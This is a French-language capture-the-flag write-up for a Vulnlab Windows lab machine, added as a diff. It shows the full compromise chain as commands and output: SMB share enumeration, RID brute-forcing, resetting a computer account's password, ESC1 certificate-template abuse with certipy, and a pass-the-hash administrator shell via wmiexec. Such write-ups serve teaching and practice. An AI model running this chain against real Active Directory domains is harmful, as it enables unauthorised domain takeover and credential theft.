@@ -1,0 +1,388 @@
+---
+title: Retro - Easy
+description: WU Retro - Easy
+categories: [Writeup]
+tags: [writeup]
+template: doc
+---
+import { Image } from 'astro:assets';
+import banner from '../../../../assets/writeup/vulnlab/banner.jpeg';
+
+<Image src={banner} alt="banner" format="avif" quality={"mid"}/>
+
+
+# Retro
+
+
+| OS | Difficulty | Target |
+|----|----|----|
+| Windows | <span style="color:green">**EASY**</span> | 10.10.88.233 |
+
+
+
+# 🔭 Enumeration
+
+```sh
+PORT     STATE SERVICE
+53/tcp   open  domain
+88/tcp   open  kerberos-sec
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+389/tcp  open  ldap
+445/tcp  open  microsoft-ds
+464/tcp  open  kpasswd5
+593/tcp  open  http-rpc-epmap
+636/tcp  open  ldapssl
+3268/tcp open  globalcatLDAP
+3269/tcp open  globalcatLDAPssl
+3389/tcp open  ms-wbt-server
+```
+
+Scan approfondi:
+
+```sh
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-09-22 12:02:17Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=DC.retro.vl
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.retro.vl
+| Not valid before: 2024-09-22T11:51:18
+|_Not valid after:  2025-09-22T11:51:18
+|_ssl-date: TLS randomness does not represent time
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=DC.retro.vl
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.retro.vl
+| Not valid before: 2024-09-22T11:51:18
+|_Not valid after:  2025-09-22T11:51:18
+|_ssl-date: TLS randomness does not represent time
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=DC.retro.vl
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.retro.vl
+| Not valid before: 2024-09-22T11:51:18
+|_Not valid after:  2025-09-22T11:51:18
+3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=DC.retro.vl
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.retro.vl
+| Not valid before: 2024-09-22T11:51:18
+|_Not valid after:  2025-09-22T11:51:18
+|_ssl-date: TLS randomness does not represent time
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+| ssl-cert: Subject: commonName=DC.retro.vl
+| Not valid before: 2024-09-21T12:00:10
+|_Not valid after:  2025-03-23T12:00:10
+|_ssl-date: 2024-09-22T12:03:36+00:00; -1s from scanner time.
+| rdp-ntlm-info: 
+|   Target_Name: RETRO
+|   NetBIOS_Domain_Name: RETRO
+|   NetBIOS_Computer_Name: DC
+|   DNS_Domain_Name: retro.vl
+|   DNS_Computer_Name: DC.retro.vl
+|   Product_Version: 10.0.20348
+|_  System_Time: 2024-09-22T12:02:56+00:00
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: -1s, deviation: 0s, median: -1s
+| smb2-time: 
+|   date: 2024-09-22T12:02:57
+|_  start_date: N/A
+| smb2-security-mode: 
+|   311: 
+|_    Message signing enabled and required
+```
+Le protocol étant ouvert, regardons cela de plus près.
+
+```sh
+smbclient -L 10.10.88.233  
+Password for [WORKGROUP\root]:
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	IPC$            IPC       Remote IPC
+	NETLOGON        Disk      Logon server share 
+	Notes           Disk      
+	SYSVOL          Disk      Logon server share 
+	Trainees        Disk      
+SMB1 disabled -- no workgroup available
+```
+
+```sh
+smbclient //10.10.88.233/Trainees -U "" 
+Password for [WORKGROUP\]:
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Sun Jul 23 23:58:43 2023
+  ..                                DHS        0  Wed Jul 26 11:54:14 2023
+  Important.txt                       A      288  Mon Jul 24 00:00:13 2023
+get
+		6261499 blocks of size 4096. 2890818 blocks available
+smb: \> get Important.txt
+getting file \Important.txt of size 288 as Important.txt (1.2 KiloBytes/sec) (average 1.2 KiloBytes/sec)
+smb: \> 
+```
+
+```sh
+cat Important.txt  
+Dear Trainees,
+
+I know that some of you seemed to struggle with remembering strong and unique passwords.
+So we decided to bundle every one of you up into one account.
+Stop bothering us. Please. We have other stuff to do than resetting your password every day.
+
+Regards
+
+The Admins#                                               
+```
+Il semblerait que le groupe `Trainees` possède un seul et unique compte. Nous avons tenté d'utiliser `ldapsearch` mais sans succès. En cherchant, le script `lookupsid` permet de faire une énumération LDAP.
+
+```sh
+lookupsid.py anonymous@10.10.88.233
+Impacket for Exegol - v0.10.1.dev1+20240403.124027.3e5f85b - Copyright 2022 Fortra - forked by ThePorgs
+
+Password:
+[*] Brute forcing SIDs at 10.10.88.233
+[*] StringBinding ncacn_np:10.10.88.233[\pipe\lsarpc]
+[*] Domain SID is: S-1-5-21-2983547755-698260136-4283918172
+498: RETRO\Enterprise Read-only Domain Controllers (SidTypeGroup)
+500: RETRO\Administrator (SidTypeUser)
+501: RETRO\Guest (SidTypeUser)
+502: RETRO\krbtgt (SidTypeUser)
+512: RETRO\Domain Admins (SidTypeGroup)
+513: RETRO\Domain Users (SidTypeGroup)
+514: RETRO\Domain Guests (SidTypeGroup)
+515: RETRO\Domain Computers (SidTypeGroup)
+516: RETRO\Domain Controllers (SidTypeGroup)
+517: RETRO\Cert Publishers (SidTypeAlias)
+518: RETRO\Schema Admins (SidTypeGroup)
+519: RETRO\Enterprise Admins (SidTypeGroup)
+520: RETRO\Group Policy Creator Owners (SidTypeGroup)
+521: RETRO\Read-only Domain Controllers (SidTypeGroup)
+522: RETRO\Cloneable Domain Controllers (SidTypeGroup)
+525: RETRO\Protected Users (SidTypeGroup)
+526: RETRO\Key Admins (SidTypeGroup)
+527: RETRO\Enterprise Key Admins (SidTypeGroup)
+553: RETRO\RAS and IAS Servers (SidTypeAlias)
+571: RETRO\Allowed RODC Password Replication Group (SidTypeAlias)
+572: RETRO\Denied RODC Password Replication Group (SidTypeAlias)
+1000: RETRO\DC$ (SidTypeUser)
+1101: RETRO\DnsAdmins (SidTypeAlias)
+1102: RETRO\DnsUpdateProxy (SidTypeGroup)
+1104: RETRO\trainee (SidTypeUser)
+1106: RETRO\BANKING$ (SidTypeUser)
+1107: RETRO\jburley (SidTypeUser)
+1108: RETRO\HelpDesk (SidTypeGroup)
+1109: RETRO\tblack (SidTypeUser)
+```
+Fruits de plusieurs dizaines de minutes de recherche, la connexion au dossier partagé `Notes` avec le compte `trainee` nous permet de voir un fichier texte mentionnant le compte `BANKING$`.
+Nous utilisons le paquet `kbr5-user`:
+*"This package contains the basic programs to authenticate to MIT Kerberos, change passwords, and talk to the admin server (to create and delete principals, list principals, etc.)."*
+[Lien du MIT](https://web.mit.edu/kerberos/krb5-1.3/krb5-1.3/doc/krb5-user.html)
+```sh
+apt install krb5-user
+vim /etc/krb5.conf
+[libdefaults]
+     default_realm = RETRO.VL
+     dns_lookup_realm = false
+     ticket_lifetime = 24h
+     renew_lifetime = 7d
+     rdns = false
+     kdc_timesync = 1
+     ccache_type = 4
+     forwadable = true
+     proxiable = true
+
+[realms]
+     RETRO.VL = {
+         kdc = DC.RETRO.VL
+         admin_server = DC.RETRO.VL
+     }
+```
+```sh
+kpasswd BANKING$
+Password for BANKING$@RETRO.VL: 
+Enter new password: 
+Enter it again: 
+Password changed.
+```
+Le mot de passe est changé avec succès, mais nous ne pouvons pas nous connecter avec. Dans le `nmap` approfondi, on peut voir qu'un `ADCS`est en place, nous utilisons donc `certipy` dans le but de vérifier, identifier et copier les informations des certificats de l'AD.
+
+# 🎯 Privilege Escalation
+
+```sh
+certipy find -u 'BANKING$'@retro.vl -p "password123" -dc-ip 10.10.88.233      
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 34 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 12 enabled certificate templates
+[*] Trying to get CA configuration for 'retro-DC-CA' via CSRA
+[!] Got error while trying to get CA configuration for 'retro-DC-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
+[*] Trying to get CA configuration for 'retro-DC-CA' via RRP
+[!] Failed to connect to remote registry. Service should be starting now. Trying again...
+[*] Got CA configuration for 'retro-DC-CA'
+[*] Saved BloodHound data to '20240922162548_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
+[*] Saved text output to '20240922162548_Certipy.txt'
+[*] Saved JSON output to '20240922162548_Certipy.json'
+```
+```sh
+cat 20240922162548_Certipy.txt
+Certificate Authorities
+  0
+    CA Name                             : retro-DC-CA
+    DNS Name                            : DC.retro.vl
+    Certificate Subject                 : CN=retro-DC-CA, DC=retro, DC=vl
+    Certificate Serial Number           : 7A107F4C115097984B35539AA62E5C85
+    Certificate Validity Start          : 2023-07-23 21:03:51+00:00
+    Certificate Validity End            : 2028-07-23 21:13:50+00:00
+    Web Enrollment                      : Disabled
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Enabled
+    Permissions
+      Owner                             : RETRO.VL\Administrators
+      Access Rights
+        ManageCertificates              : RETRO.VL\Administrators
+                                          RETRO.VL\Domain Admins
+                                          RETRO.VL\Enterprise Admins
+        ManageCa                        : RETRO.VL\Administrators
+                                          RETRO.VL\Domain Admins
+                                          RETRO.VL\Enterprise Admins
+        Enroll                          : RETRO.VL\Authenticated Users
+Certificate Templates
+  0
+    Template Name                       : RetroClients
+    Display Name                        : Retro Clients
+    Certificate Authorities             : retro-DC-CA
+    Enabled                             : True
+    Client Authentication               : True
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : True
+    Certificate Name Flag               : EnrolleeSuppliesSubject
+    Enrollment Flag                     : None
+    Private Key Flag                    : 16842752
+    Extended Key Usage                  : Client Authentication
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Validity Period                     : 1 year
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 4096
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : RETRO.VL\Domain Admins
+                                          RETRO.VL\Domain Computers
+                                          RETRO.VL\Enterprise Admins
+      Object Control Permissions
+        Owner                           : RETRO.VL\Administrator
+        Write Owner Principals          : RETRO.VL\Domain Admins
+                                          RETRO.VL\Enterprise Admins
+                                          RETRO.VL\Administrator
+        Write Dacl Principals           : RETRO.VL\Domain Admins
+                                          RETRO.VL\Enterprise Admins
+                                          RETRO.VL\Administrator
+        Write Property Principals       : RETRO.VL\Domain Admins
+                                          RETRO.VL\Enterprise Admins
+                                          RETRO.VL\Administrator
+    [!] Vulnerabilities
+      ESC1                              : 'RETRO.VL\\Domain Computers' can enroll, enrollee supplies subject and template allows client authentication
+```
+En lisant la sortie de la commande précédente, il s'avère que `Retro Clients`est susceptible d'être vulnérable (`ESC1`). L'objectif, à partir de ce constat est de récupérer le hash `administrator` pour tenter une connexion au protocol smb par la suite.
+
+Récupération du certificat et de la clé privée:
+```sh
+certipy req -u 'banking$'@retro.vl -p 'password123' -c 'retro-DC-CA' -target 'dc.retro.vl' -template 'RetroClients' -upn 'administrator@retro.vl' -dns 'dc.retro.vl' -key-size 4096 -debug
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[+] Trying to resolve 'dc.retro.vl' at '127.0.0.53'
+[+] Trying to resolve 'RETRO.VL' at '127.0.0.53'
+[+] Generating RSA key
+[*] Requesting certificate via RPC
+[+] Trying to connect to endpoint: ncacn_np:10.10.88.233[\pipe\cert]
+[+] Connected to endpoint: ncacn_np:10.10.88.233[\pipe\cert]
+[*] Successfully requested certificate
+[*] Request ID is 9
+[*] Got certificate with multiple identifications
+    UPN: 'administrator@retro.vl'
+    DNS Host Name: 'dc.retro.vl'
+[*] Certificate has no object SID
+[*] Saved certificate and private key to 'administrator_dc.pfx'
+```
+Récupération du hash grâce au fichier `administrator_dc.pfx`
+```sh
+certipy auth -pfx administrator_dc.pfx -dc-ip 10.10.88.233
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Found multiple identifications in certificate
+[*] Please select one:
+    [0] UPN: 'administrator@retro.vl'
+    [1] DNS Host Name: 'dc.retro.vl'
+> 0
+[*] Using principal: administrator@retro.vl
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saved credential cache to 'administrator.ccache'
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@retro.vl': aad<REDACTED>89
+```
+Nous avons bien récupéré le hash, utilisons `wmiexec` pour nous connecter avec le hash d'`administrator`.
+```sh
+wmiexec.py administrator@10.10.88.233 -hashes aad<REDACTED>89
+Impacket for Exegol - v0.10.1.dev1+20240403.124027.3e5f85b - Copyright 2022 Fortra - forked by ThePorgs
+
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\>whoami
+retro\administrator
+C:\Users>cd Administrator
+C:\Users\Administrator>dir
+ Volume in drive C has no label.
+ Volume Serial Number is 047C-7682
+
+ Directory of C:\Users\Administrator
+
+07/23/2023  01:48 PM    <DIR>          .
+07/23/2023  01:47 PM    <DIR>          ..
+07/23/2023  01:48 PM    <DIR>          3D Objects
+07/23/2023  01:48 PM    <DIR>          Contacts
+07/25/2023  12:37 PM    <DIR>          Desktop
+07/23/2023  01:48 PM    <DIR>          Documents
+07/23/2023  01:48 PM    <DIR>          Downloads
+07/23/2023  01:48 PM    <DIR>          Favorites
+07/23/2023  01:48 PM    <DIR>          Links
+07/23/2023  01:48 PM    <DIR>          Music
+07/23/2023  01:48 PM    <DIR>          Pictures
+07/23/2023  01:48 PM    <DIR>          Saved Games
+07/23/2023  01:48 PM    <DIR>          Searches
+07/23/2023  01:48 PM    <DIR>          Videos
+               0 File(s)              0 bytes
+              14 Dir(s)   9,340,977,152 bytes free
+
+C:\Users\Administrator>cd Desktop
+dir
+C:\Users\Administrator\Desktop>dir
+ Volume in drive C has no label.
+ Volume Serial Number is 047C-7682
+
+ Directory of C:\Users\Administrator\Desktop
+
+07/25/2023  12:37 PM    <DIR>          .
+07/23/2023  01:48 PM    <DIR>          ..
+07/25/2023  12:38 PM                36 root.txt
+               1 File(s)             36 bytes
+               2 Dir(s)   9,346,560,000 bytes free
+
+C:\Users\Administrator\Desktop>type root.txt
+```
